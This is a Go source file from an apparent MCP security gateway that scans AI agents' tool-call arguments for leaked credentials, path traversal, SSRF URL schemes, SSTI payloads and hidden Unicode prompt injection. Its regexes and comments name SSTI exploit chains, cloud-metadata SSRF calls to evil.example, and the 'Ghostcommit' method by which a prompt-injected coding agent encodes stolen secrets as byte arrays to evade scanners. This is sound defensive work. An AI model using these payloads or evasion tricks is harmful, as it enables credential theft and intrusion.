package mcp

import (
	"encoding/base64"
	"fmt"
	"math"
	"regexp"
	"strconv"
	"strings"
)

// ContentSignal identifies a type of sensitive data found in tool call arguments.
type ContentSignal string

const (
	SignalPrivateKey      ContentSignal = "private_key"
	SignalAWSCredential   ContentSignal = "aws_credential"
	SignalAPIToken        ContentSignal = "api_token"
	SignalGitHubToken     ContentSignal = "github_token"
	SignalGenericSecret   ContentSignal = "generic_secret"
	SignalBase64Blob      ContentSignal = "base64_blob"
	SignalHighEntropy     ContentSignal = "high_entropy"
	SignalBearerToken     ContentSignal = "bearer_token"
	SignalBasicAuth       ContentSignal = "basic_auth"
	SignalSlackToken      ContentSignal = "slack_token"
	SignalStripeKey       ContentSignal = "stripe_key"
	SignalEnvFileContent  ContentSignal = "env_file_content"
	SignalDatabaseURI     ContentSignal = "database_uri"
	// SignalInvisibleUnicode flags content containing Unicode Tags block chars
	// (U+E0000–U+E007F) or anomalously dense Variation Selectors (U+FE00–U+FE0F,
	// U+E0100–U+E01EF). Both are used for ASCII smuggling / hidden prompt injection.
	// Tags block chars are deprecated by Unicode 5.1 — zero legitimate use in content.
	SignalInvisibleUnicode ContentSignal = "invisible_unicode"

	// SignalPathTraversal flags directory boundary violation sequences in path
	// arguments of MCP filesystem tool calls (read_file, write_file,
	// create_directory, list_directory, move_file, copy_file, create_symlink).
	// Patterns include relative parent references (../), URL-encoded variants
	// (%2e%2e, %252e%252e), and null bytes. No legitimate MCP filesystem tool
	// call passes directory boundary violation sequences in path arguments.
	SignalPathTraversal ContentSignal = "path_traversal"

	// SignalSSTIPayload flags high-confidence Server-Side Template Injection (SSTI)
	// attack payloads in tool call arguments. SSTI occurs when a prompt-injected agent
	// passes template-engine exploit syntax into a tool whose server evaluates arguments
	// through a template engine (Jinja2, Mako, Pebble, Handlebars, ERB). Successful
	// exploitation achieves RCE on the tool server with the process owner's privileges.
	// All matched patterns are specific to known SSTI exploit chains with near-zero
	// legitimate use in MCP tool call arguments.
	SignalSSTIPayload ContentSignal = "ssti_payload"

	// SignalObfuscatedSecretByteArray flags a long run of small integer literals
	// in a write-direction tool call argument that decodes to a recognizable
	// credential/secret pattern when interpreted as byte values — source content
	// that encodes a stolen secret as a numeric tuple/array instead of a literal
	// string, specifically to evade string-pattern secret scanners (including
	// every other check in this file). Documented as the "Ghostcommit" technique
	// (ASSET Research Group, University of Missouri-Kansas City, disclosed
	// 2026-07-11): a prompt-injected coding agent reads a credential file (e.g.
	// .env) byte-by-byte and emits an integer tuple/array as a module-level
	// constant, so text-based code review and string-based secrets scanners never
	// see a recognizable credential shape. Taxonomy:
	// credential-exposure/code-generation-exposure/ai-generated-secret-scanner-evasion
	// (shares the node with mcp-struct-block-secret-scanner-evasion, which covers
	// the explicit-intent-text variant of the same evasion class; this signal
	// covers the bare-payload variant that carries no scanner name or evasion verb).
	SignalObfuscatedSecretByteArray ContentSignal = "obfuscated_secret_byte_array"
)

// ContentFinding records one detected sensitive data signal in an argument value.
type ContentFinding struct {
	Signal   ContentSignal `json:"signal"`
	Detail   string        `json:"detail"`
	ArgName  string        `json:"arg_name"`
	MatchLen int           `json:"match_len,omitempty"`
	// TaxonomyRef optionally links this finding to a taxonomy entry. Most
	// signals in this file are ad-hoc "content:<signal>" findings with no
	// taxonomy assignment (a pre-existing gap); set this only when a finding
	// has a clear, verified taxonomy home so the caller can propagate it to
	// the audit trail without guessing.
	TaxonomyRef string `json:"taxonomy,omitempty"`
}

// ContentScanResult is the result of scanning tool call arguments.
type ContentScanResult struct {
	ToolName string           `json:"tool_name"`
	Blocked  bool             `json:"blocked"`
	Findings []ContentFinding `json:"findings,omitempty"`
}

// ScanToolCallContent checks all argument values of a tool call for
// sensitive data that may indicate exfiltration. Returns findings if any
// secrets, credentials, or suspicious encoded data are detected.
func ScanToolCallContent(toolName string, arguments map[string]interface{}) ContentScanResult {
	result := ContentScanResult{ToolName: toolName}

	for argName, argValue := range arguments {
		text := argValueToString(argValue)
		if text == "" {
			continue
		}

		scanArgumentValue(&result, argName, text)
	}

	result.Blocked = len(result.Findings) > 0
	return result
}

// filesystemToolNames is the set of MCP filesystem tool names whose path
// arguments are scanned for directory boundary violation sequences.
// These are the standard @modelcontextprotocol/server-filesystem tool names
// plus common aliases used by community implementations.
var filesystemToolNames = map[string]bool{
	"read_file":        true,
	"write_file":       true,
	"create_directory": true,
	"list_directory":   true,
	"move_file":        true,
	"copy_file":        true,
	"create_symlink":   true,
	// Common aliases
	"readFile":        true,
	"writeFile":       true,
	"createDirectory": true,
	"listDirectory":   true,
	"moveFile":        true,
	"copyFile":        true,
	"createSymlink":   true,
}

// filesystemPathArgNames is the set of argument key names that carry file
// paths in MCP filesystem tool calls. Covers the standard MCP spec keys
// and common alternatives used by community server implementations.
var filesystemPathArgNames = map[string]bool{
	"path":        true,
	"source":      true,
	"destination": true,
	"target":      true,
	"src":         true,
	"dst":         true,
}

// PathTraversalFinding records one detected directory boundary violation in a
// filesystem tool call path argument.
type PathTraversalFinding struct {
	// ArgName is the argument key containing the violation (e.g., "path", "source").
	ArgName string
	// Value is the raw argument value that triggered detection.
	Value string
	// Detail is a human-readable description of the detected pattern.
	Detail string
}

// FilesystemPathTraversalResult is the result of scanning a filesystem tool
// call for directory boundary violation sequences.
type FilesystemPathTraversalResult struct {
	// ToolName is the MCP tool that was called.
	ToolName string
	// Blocked is true when at least one traversal pattern was detected.
	Blocked bool
	// Findings lists each detected violation.
	Findings []PathTraversalFinding
}

// fsHijackSchemeRE matches a NETWORK / remote URL scheme at the START of a
// filesystem-tool path argument (case-insensitive, tolerating leading
// whitespace). A local-filesystem tool's path argument (read_file, write_file,
// list_directory, copy_file, …) is supposed to be a local path — never a
// network URL. When the value carries one of these schemes, the MCP server is
// coerced into an OUTBOUND request the agent never authorised: SSRF to a cloud
// IMDS endpoint (http://169.254.169.254/…), an internal admin service
// (http://localhost:8080/…), or a remote payload the agent then trusts as a
// "local file" (https://evil/payload). It is the tools/call analogue of the
// resources/read SSRF class, via a confused-deputy filesystem tool.
//
// Deliberately EXCLUDED to stay false-positive-free:
//   - file:// — a legitimate local-filesystem URI (and file:// traversal is
//     already covered by the path-traversal scanner + premium pack rule).
//   - s3://, gs://, az://, abfs://, oci:// — cloud object-store schemes that
//     filesystem-abstraction servers legitimately back paths with.
//   - smb://, nfs://, rsync:// — enterprise network mounts a filesystem server
//     may legitimately expose.
//   - schemes embedded mid-string (a path/filename merely containing "http")
//     never match because the pattern is anchored at start (^).
var fsHijackSchemeRE = regexp.MustCompile(`(?i)^\s*(https?|ftps?|gopher|dict|tftp|sftp|ssh|telnet|ldaps?)://`)

// SchemeHijackFinding records one filesystem-tool path argument whose value is
// a remote URL scheme rather than a local path.
type SchemeHijackFinding struct {
	// ArgName is the argument key containing the URL (e.g., "path", "source").
	ArgName string
	// Scheme is the offending URL scheme (lowercased, without "://").
	Scheme string
	// Value is the raw argument value that triggered detection.
	Value string
}

// FilesystemSchemeHijackResult is the result of scanning a filesystem tool call
// for remote-URL-scheme path arguments.
type FilesystemSchemeHijackResult struct {
	ToolName string
	Blocked  bool
	Findings []SchemeHijackFinding
}

// ScanFilesystemSchemeHijack inspects the path-shaped arguments of a recognised
// MCP filesystem tool and flags any whose value begins with a remote network
// URL scheme. This catches SSRF / remote-fetch attacks routed through a tool the
// agent trusts as a local-file reader — e.g.,
//
//	read_file({"path": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"})
//	read_file({"path": "https://evil.example/payload"})
//	copy_file({"source": "ftp://evil.example/x", "destination": "/tmp/y"})
//
// It is scoped to the same tool set and argument keys as
// ScanFilesystemPathTraversal, and is false-positive-free by construction:
// local paths, file:// URIs, cloud object-store schemes, and filenames that
// merely contain a scheme word do not match (see fsHijackSchemeRE).
func ScanFilesystemSchemeHijack(toolName string, arguments map[string]interface{}) FilesystemSchemeHijackResult {
	result := FilesystemSchemeHijackResult{ToolName: toolName}

	if !filesystemToolNames[toolName] {
		return result
	}

	for argName, argValue := range arguments {
		if !filesystemPathArgNames[argName] {
			continue
		}
		text, ok := argValue.(string)
		if !ok || text == "" {
			continue
		}
		if m := fsHijackSchemeRE.FindStringSubmatch(text); m != nil {
			result.Findings = append(result.Findings, SchemeHijackFinding{
				ArgName: argName,
				Scheme:  strings.ToLower(m[1]),
				Value:   text,
			})
		}
	}

	result.Blocked = len(result.Findings) > 0
	return result
}

// ScanFilesystemPathTraversal scans path arguments of MCP filesystem tool calls
// for directory boundary violation sequences. It returns a result with Blocked=true
// if any traversal pattern is found in a path argument of a recognised filesystem tool.
//
// Target tools: read_file, write_file, create_directory, list_directory,
// move_file, copy_file, create_symlink (and camelCase aliases).
//
// Target argument keys: path, source, destination, target, src, dst.
//
// Detected patterns:
//   - Relative parent references: sequences of two dots followed by a separator
//     (/, \, or end-of-string), optionally preceded by a separator.
//   - URL-encoded variants: %2e%2e, %252e%252e (single and double-encoded).
//   - Null bytes: \x00 anywhere in a path argument (truncation attack).
//
// Note: benign relative paths like ./src/config.yaml do NOT trigger this
// scanner — a single leading dot is not a directory boundary violation.
func ScanFilesystemPathTraversal(toolName string, arguments map[string]interface{}) FilesystemPathTraversalResult {
	result := FilesystemPathTraversalResult{ToolName: toolName}

	if !filesystemToolNames[toolName] {
		return result
	}

	for argName, argValue := range arguments {
		if !filesystemPathArgNames[argName] {
			continue
		}

		text, ok := argValue.(string)
		if !ok || text == "" {
			continue
		}

		if detail := detectPathTraversal(text); detail != "" {
			result.Findings = append(result.Findings, PathTraversalFinding{
				ArgName: argName,
				Value:   text,
				Detail:  detail,
			})
		}
	}

	result.Blocked = len(result.Findings) > 0
	return result
}

// detectPathTraversal returns a non-empty detail string if the given path
// value contains a directory boundary violation sequence, or "" if clean.
func detectPathTraversal(path string) string {
	// Null byte injection — truncates path at OS level after prefix check.
	if strings.ContainsRune(path, '\x00') {
		return "null byte in path argument — null-byte injection bypasses prefix check while OS truncates at the null byte"
	}

	// URL-encoded variants — double-encoded first so we don't miss %252e after
	// decoding the outer %25.
	lower := strings.ToLower(path)
	if strings.Contains(lower, "%252e%252e") {
		return "double-URL-encoded parent reference (%252e%252e) in path argument — survives single-pass URL decoding while resolving as parent traversal"
	}
	if strings.Contains(lower, "%2e%2e") {
		return "URL-encoded parent reference (%2e%2e) in path argument — bypasses string-level containment checks before URL decoding"
	}

	// Literal parent traversal: look for sequences that match ../ or ..\ or
	// a path segment ending in .. (like /workspace/.. or /workspace/..).
	// Pattern: optional leading separator + two dots + separator or end-of-string.
	// We intentionally do NOT flag a leading "./" (single dot) — that is benign.
	if pathTraversalRe.MatchString(path) {
		return "directory parent traversal sequence (.. + separator) detected in path argument — bypasses naive prefix checks that do not canonicalize before validation"
	}

	return ""
}

// pathTraversalRe matches directory parent traversal sequences in path strings.
// It requires the double-dot to be preceded by a path separator or start-of-string
// and followed by a path separator, end-of-string, or %2f (URL-encoded slash).
// This avoids false positives on filenames containing ".." as a substring
// (e.g., "version..2.tar.gz") while reliably catching traversal attempts.
var pathTraversalRe = regexp.MustCompile(`(?i)(^|[/\\])\.\.(([/\\]|%2f)|$)`)

// scanArgumentValue runs all content detection patterns against a single argument value.
func scanArgumentValue(result *ContentScanResult, argName, text string) {
	// Private keys
	if privateKeyRe.MatchString(text) {
		result.Findings = append(result.Findings, ContentFinding{
			Signal:  SignalPrivateKey,
			Detail:  "SSH/PGP private key detected in argument",
			ArgName: argName,
		})
	}

	// AWS access keys
	if awsAccessKeyRe.MatchString(text) {
		result.Findings = append(result.Findings, ContentFinding{
			Signal:  SignalAWSCredential,
			Detail:  "AWS access key ID detected",
			ArgName: argName,
		})
	}

	// AWS secret patterns
	if awsSecretRe.MatchString(text) {
		result.Findings = append(result.Findings, ContentFinding{
			Signal:  SignalAWSCredential,
			Detail:  "AWS credential assignment detected",
			ArgName: argName,
		})
	}

	// GitHub tokens
	if githubTokenRe.MatchString(text) {
		result.Findings = append(result.Findings, ContentFinding{
			Signal:  SignalGitHubToken,
			Detail:  "GitHub token detected",
			ArgName: argName,
		})
	}

	// Bearer tokens
	if bearerTokenRe.MatchString(text) {
		result.Findings = append(result.Findings, ContentFinding{
			Signal:  SignalBearerToken,
			Detail:  "Bearer token detected",
			ArgName: argName,
		})
	}

	// Basic auth in URLs
	if basicAuthRe.MatchString(text) {
		result.Findings = append(result.Findings, ContentFinding{
			Signal:  SignalBasicAuth,
			Detail:  "Basic auth credentials in URL detected",
			ArgName: argName,
		})
	}

	// Slack tokens
	if slackTokenRe.MatchString(text) {
		result.Findings = append(result.Findings, ContentFinding{
			Signal:  SignalSlackToken,
			Detail:  "Slack token detected",
			ArgName: argName,
		})
	}

	// Stripe keys
	if stripeKeyRe.MatchString(text) {
		result.Findings = append(result.Findings, ContentFinding{
			Signal:  SignalStripeKey,
			Detail:  "Stripe secret key detected",
			ArgName: argName,
		})
	}

	// Generic API key/secret assignments
	if genericSecretRe.MatchString(text) {
		result.Findings = append(result.Findings, ContentFinding{
			Signal:  SignalGenericSecret,
			Detail:  "API key or secret assignment detected",
			ArgName: argName,
		})
	}

	// .env file content (multiple KEY=VALUE lines with sensitive names)
	if looksLikeEnvFileContent(text) {
		result.Findings = append(result.Findings, ContentFinding{
			Signal:  SignalEnvFileContent,
			Detail:  "Content resembles .env file with secrets",
			ArgName: argName,
		})
	}

	// Database URIs with embedded credentials (mysql://user:pass@host/db)
	// Catches connection strings passed as tool call arguments that bypass
	// resource-read rules (taxonomy: credential-exposure/database-access).
	if m := dbURIWithCredentialsRe.FindString(text); m != "" {
		result.Findings = append(result.Findings, ContentFinding{
			Signal:  SignalDatabaseURI,
			Detail:  "Database URI with embedded credentials detected in argument",
			ArgName: argName,
		})
	}

	// Large base64 blobs (potential encoded file exfiltration)
	if b64Len := largestBase64Chunk(text); b64Len >= minBase64BlobLen {
		result.Findings = append(result.Findings, ContentFinding{
			Signal:   SignalBase64Blob,
			Detail:   fmt.Sprintf("Large base64-encoded blob (%d chars) — possible encoded file exfiltration", b64Len),
			ArgName:  argName,
			MatchLen: b64Len,
		})
	}

	// High-entropy strings (potential encoded secrets)
	if isHighEntropy(text, minHighEntropyLen) {
		result.Findings = append(result.Findings, ContentFinding{
			Signal:  SignalHighEntropy,
			Detail:  "High-entropy string detected — possible encoded secret",
			ArgName: argName,
		})
	}

	// Invisible Unicode: Tags block (U+E0000-U+E007F) or dense Variation Selectors
	if signal, detail := checkInvisibleUnicode(text); signal != "" {
		result.Findings = append(result.Findings, ContentFinding{
			Signal:  SignalInvisibleUnicode,
			Detail:  detail,
			ArgName: argName,
		})
	}

	// SSTI (Server-Side Template Injection) exploit payloads in tool arguments —
	// Python object chain traversal, Jinja2 lipsum/namespace exploits, Handlebars
	// constructor RCE, Ruby ERB OS exec, and Mako open() file-read patterns.
	if m := sstiPayloadRe.FindString(text); m != "" {
		trunc := m
		if len(trunc) > 80 {
			trunc = trunc[:80] + "…"
		}
		result.Findings = append(result.Findings, ContentFinding{
			Signal:  SignalSSTIPayload,
			Detail:  "SSTI exploit payload detected in tool argument: " + trunc,
			ArgName: argName,
		})
	}

	// Obfuscated-secret byte-array encoding (Ghostcommit class): a long run of
	// small integer literals that decodes to a recognizable credential pattern.
	// See SignalObfuscatedSecretByteArray for the full threat description.
	if decoded, ok := decodeObfuscatedSecretByteArray(text); ok {
		trunc := decoded
		if len(trunc) > 80 {
			trunc = trunc[:80] + "…"
		}
		result.Findings = append(result.Findings, ContentFinding{
			Signal:      SignalObfuscatedSecretByteArray,
			Detail:      fmt.Sprintf("Numeric byte-array literal decodes to a recognizable credential pattern (%q) — obfuscated secret exfiltration", trunc),
			ArgName:     argName,
			TaxonomyRef: "credential-exposure/code-generation-exposure/ai-generated-secret-scanner-evasion",
		})
	}
}

// ── Compiled patterns ──────────────────────────────────────────────────────

var (
	privateKeyRe    = regexp.MustCompile(`-----BEGIN (RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY( BLOCK)?-----`)
	awsAccessKeyRe  = regexp.MustCompile(`AKIA[0-9A-Z]{16}`)
	awsSecretRe     = regexp.MustCompile(`(?i)(aws_secret_access_key|aws_access_key_id|aws_session_token)\s*[=:]\s*\S{16,}`)
	// Covers classic tokens (ghp_, ghs_), Actions tokens (gha_), refresh tokens
	// (ghr_), and fine-grained PATs introduced in 2022 (github_pat_...).
	// Fine-grained PATs are typically 93+ chars after the prefix; use {80,} to
	// handle any minor length variations GitHub may introduce.
	githubTokenRe = regexp.MustCompile(`gh[psar]_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{80,}`)
	bearerTokenRe   = regexp.MustCompile(`(?i)bearer\s+[A-Za-z0-9_\-.]{20,}`)
	basicAuthRe     = regexp.MustCompile(`https?://[^:]+:[^@]+@`)
	slackTokenRe    = regexp.MustCompile(`xox[baprs]-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9-]*`)
	stripeKeyRe     = regexp.MustCompile(`sk_live_[0-9a-zA-Z]{24}`)
	genericSecretRe = regexp.MustCompile(`(?i)(api_key|apikey|api-key|secret_key|secretkey|secret-key|access_token|auth_token|private_key)\s*[=:]\s*['"]?[A-Za-z0-9_\-/+=]{16,}['"]?`)

	// dbURIWithCredentialsRe matches database connection URIs that contain
	// embedded user:password credentials. Covers MySQL, PostgreSQL, MongoDB
	// (including +srv), Redis (including rediss TLS), MSSQL, and Oracle.
	// The credentials portion ([user]:pass@) must be present — username may be
	// empty (e.g. redis://:password@host) but password must be non-empty — to
	// avoid false positives on bare host:port URIs.
	// Taxonomy: credential-exposure/database-access/database-credential-access
	dbURIWithCredentialsRe = regexp.MustCompile(`(?i)(mysql|postgres(?:ql)?|mongodb(?:\+srv)?|rediss?|mssql|oracle)://[^/\s@:]*:[^/\s@]+@`)

	envLineRe = regexp.MustCompile(`(?i)^[A-Z_]{2,}=\S+`)

	// sstiPayloadRe matches high-confidence SSTI exploit patterns that have near-zero
	// legitimate use in MCP tool call arguments. Covers:
	//   - Python type chain traversal: __class__.__mro__, __class__.__init__.__globals__
	//   - Jinja2 lipsum/namespace exploits: lipsum.__globals__, namespace.glob(
	//   - Jinja2 filter bypass: |attr('__class__')
	//   - Handlebars constructor RCE: (fn 'return process'), (fn 'return require')
	//   - Ruby ERB OS exec: <%= system(...), <%= exec(...)
	//   - Mako/Python template file read: ${open('/...
	sstiPayloadRe = regexp.MustCompile(
		`__class__\s*\.\s*__mro__` +
			`|__class__\s*\.\s*__init__\s*\.\s*__globals__` +
			`|\blipsum\s*\.\s*__globals__\b` +
			`|\bnamespace\s*\.\s*glob\s*\(` +
			`|\|attr\s*\(\s*['"]__class__['"]\s*\)` +
			`|\(fn\s+['"]return\s+(process|require)\b` +
			`|<%[-=]?\s*(system|exec|IO\.popen)\s*\(` +
			`|\$\{\s*open\s*\(\s*['"]\/`,
	)
)

// Thresholds
const (
	minBase64BlobLen     = 200 // characters — roughly 150 bytes decoded
	minHighEntropyLen    = 100 // characters for standalone high-entropy check
	highEntropyThreshold = 4.5 // bits per character (English text ~3.5, random ~5.5)
)

// ── Helper functions ─────────────────────────────────────────────────────

// argValueToString converts an argument value to a string for scanning.
func argValueToString(v interface{}) string {
	switch val := v.(type) {
	case string:
		return val
	case float64, int, int64, bool:
		return fmt.Sprintf("%v", val)
	case map[string]interface{}:
		// Recurse into nested objects — concatenate all string values
		var parts []string
		for _, nested := range val {
			if s := argValueToString(nested); s != "" {
				parts = append(parts, s)
			}
		}
		return strings.Join(parts, "\n")
	case []interface{}:
		var parts []string
		for _, item := range val {
			if s := argValueToString(item); s != "" {
				parts = append(parts, s)
			}
		}
		return strings.Join(parts, "\n")
	default:
		return fmt.Sprintf("%v", v)
	}
}

// largestBase64Chunk finds the longest contiguous base64-looking substring.
// Returns its length, or 0 if none found above threshold.
func largestBase64Chunk(text string) int {
	// Match long runs of base64 characters (with optional line breaks)
	b64Re := regexp.MustCompile(`[A-Za-z0-9+/=\n\r]{100,}`)
	matches := b64Re.FindAllString(text, -1)

	maxLen := 0
	for _, m := range matches {
		clean := strings.Map(func(r rune) rune {
			if r == '\n' || r == '\r' {
				return -1
			}
			return r
		}, m)

		// Verify it actually decodes as valid base64
		if len(clean) > maxLen {
			if _, err := base64.StdEncoding.DecodeString(padBase64(clean)); err == nil {
				maxLen = len(clean)
			} else if _, err := base64.RawStdEncoding.DecodeString(clean); err == nil {
				maxLen = len(clean)
			}
		}
	}
	return maxLen
}

// padBase64 adds padding if needed.
func padBase64(s string) string {
	if m := len(s) % 4; m != 0 {
		s += strings.Repeat("=", 4-m)
	}
	return s
}

// minByteArrayRunLen is the minimum count of consecutive small-integer
// literals required before a numeric run is considered for byte-array
// decoding. Chosen well below the ~311-integer run observed in the disclosed
// Ghostcommit PoC (a full .env file) while staying high enough that
// incidental short numeric lists (retry counts, HTTP status code tables,
// version tuples) never reach this length.
const minByteArrayRunLen = 30

// numericRunCandidateRe matches a run of comma/whitespace-separated 1-3 digit
// integers — the shape of a Python tuple, JS/Go array, or similar literal
// used to encode arbitrary bytes as source code (e.g. `(72, 101, 108, ...)`).
// Requires at least minByteArrayRunLen numbers. Byte-range validity (0-255)
// is checked in Go after extraction rather than in the regex itself, since a
// value-range alternation is harder to read and no more precise than a
// post-hoc numeric check.
var numericRunCandidateRe = regexp.MustCompile(`\b\d{1,3}(?:[,\s]+\d{1,3}){29,}\b`)

// decodeObfuscatedSecretByteArray finds the longest run of small-integer
// literals in text, decodes it as a byte sequence, and — only if the decoded
// bytes are overwhelmingly printable text — checks whether the decoded string
// matches one of the existing credential/secret patterns. This closes the
// exact evasion the "Ghostcommit" technique depends on: encoding a stolen
// secret's bytes as a numeric constant so no string-based scanner (including
// every other check in this file, without this step) ever sees a
// recognizable credential shape. Returns the decoded text and true only when
// a known secret pattern is confirmed in it — a bare long run of small
// integers alone is not sufficient (real byte/pixel/lookup-table arrays are
// common enough in legitimate code that shape alone is not high-precision).
func decodeObfuscatedSecretByteArray(text string) (decoded string, found bool) {
	matches := numericRunCandidateRe.FindAllString(text, -1)
	longest := ""
	for _, m := range matches {
		if len(m) > len(longest) {
			longest = m
		}
	}
	if longest == "" {
		return "", false
	}

	numStrs := strings.FieldsFunc(longest, func(r rune) bool {
		return r < '0' || r > '9'
	})
	if len(numStrs) < minByteArrayRunLen {
		return "", false
	}

	var buf strings.Builder
	printable := 0
	for _, ns := range numStrs {
		n, err := strconv.Atoi(ns)
		if err != nil || n < 0 || n > 255 {
			return "", false
		}
		b := byte(n)
		buf.WriteByte(b)
		if b == '\t' || b == '\n' || b == '\r' || (b >= 32 && b <= 126) {
			printable++
		}
	}
	if float64(printable)/float64(len(numStrs)) < 0.9 {
		return "", false
	}

	decoded = buf.String()
	if containsKnownSecretPattern(decoded) {
		return decoded, true
	}
	return "", false
}

// containsKnownSecretPattern re-runs the existing credential/secret detectors
// against arbitrary decoded text — used to verify byte-array-decoded content
// against the same patterns that would already catch its plaintext form.
func containsKnownSecretPattern(text string) bool {
	return privateKeyRe.MatchString(text) ||
		awsAccessKeyRe.MatchString(text) ||
		awsSecretRe.MatchString(text) ||
		githubTokenRe.MatchString(text) ||
		bearerTokenRe.MatchString(text) ||
		basicAuthRe.MatchString(text) ||
		slackTokenRe.MatchString(text) ||
		stripeKeyRe.MatchString(text) ||
		genericSecretRe.MatchString(text) ||
		dbURIWithCredentialsRe.MatchString(text) ||
		looksLikeEnvFileContent(text)
}

// isHighEntropy checks if the text has suspiciously high Shannon entropy,
// suggesting encoded or encrypted content rather than natural language.
// Only triggers for strings above minLen to avoid false positives on short tokens.
func isHighEntropy(text string, minLen int) bool {
	if len(text) < minLen {
		return false
	}

	// Only check if it looks like a single block of non-whitespace
	// (not natural language with spaces)
	fields := strings.Fields(text)
	if len(fields) > 5 {
		return false // natural language — has many words
	}

	// Compute Shannon entropy on the full text
	freq := make(map[rune]float64)
	total := 0.0
	for _, r := range text {
		freq[r]++
		total++
	}

	entropy := 0.0
	for _, count := range freq {
		p := count / total
		if p > 0 {
			entropy -= p * math.Log2(p)
		}
	}

	return entropy >= highEntropyThreshold
}

// looksLikeEnvFileContent returns true if the text looks like the contents of
// a .env file (multiple KEY=VALUE lines with sensitive-looking variable names).
func looksLikeEnvFileContent(text string) bool {
	lines := strings.Split(text, "\n")
	if len(lines) < 2 {
		return false
	}

	envLines := 0
	sensitiveNames := 0
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if envLineRe.MatchString(line) {
			envLines++
			upper := strings.ToUpper(line)
			for _, keyword := range []string{"KEY", "SECRET", "TOKEN", "PASSWORD", "CREDENTIAL", "AUTH"} {
				if strings.Contains(upper, keyword) {
					sensitiveNames++
					break
				}
			}
		}
	}

	// At least 2 env-style lines with at least 1 sensitive name
	return envLines >= 2 && sensitiveNames >= 1
}

// checkInvisibleUnicode returns a non-empty signal name and detail if the text
// contains Unicode Tags block characters (U+E0000–U+E007F) or an anomalously
// high density of Variation Selectors (U+FE00–U+FE0F / U+E0100–U+E01EF).
//
// Unicode Tags block chars are deprecated since Unicode 5.1 and have zero
// legitimate use in tool call content. They are the primary vehicle for
// "ASCII smuggling" / hidden prompt injection as described by Riley Goodside
// and Joseph Thacker (2024).
//
// Variation Selector density: a single VS char (emoji variant selector U+FE0F)
// is common, but encoding hidden text as VS sequences produces densities >1%
// which are not seen in natural language content.
func checkInvisibleUnicode(text string) (string, string) {
	totalRunes := 0
	vsCount := 0
	for _, r := range text {
		totalRunes++
		switch {
		case r >= 0xE0000 && r <= 0xE007F:
			// Unicode Tags block — any occurrence is adversarial
			return "tags_block", "Unicode Tags block character (U+E0000–U+E007F) detected — invisible payload used for ASCII smuggling / hidden prompt injection"
		case (r >= 0xFE00 && r <= 0xFE0F) || (r >= 0xE0100 && r <= 0xE01EF):
			vsCount++
		}
	}
	if totalRunes > 0 && vsCount >= variationSelectorMinCount {
		density := float64(vsCount) / float64(totalRunes)
		if density >= variationSelectorDensityThreshold {
			return "vs_density", fmt.Sprintf("Anomalous Variation Selector density (%.1f%%, %d chars) — possible hidden-text encoding via ASCII smuggling", density*100, vsCount)
		}
	}
	return "", ""
}

// variationSelectorDensityThreshold is the fraction of VS chars above which
// content is flagged. Encoding payloads as VS sequences produces densities of
// 10–100%; the threshold of 5% plus a minimum of 5 VS chars prevents FPs from
// normal emoji use (e.g. a single U+FE0F text-presentation selector).
const (
	variationSelectorDensityThreshold = 0.05 // 5%
	variationSelectorMinCount         = 5    // require at least 5 VS chars
)
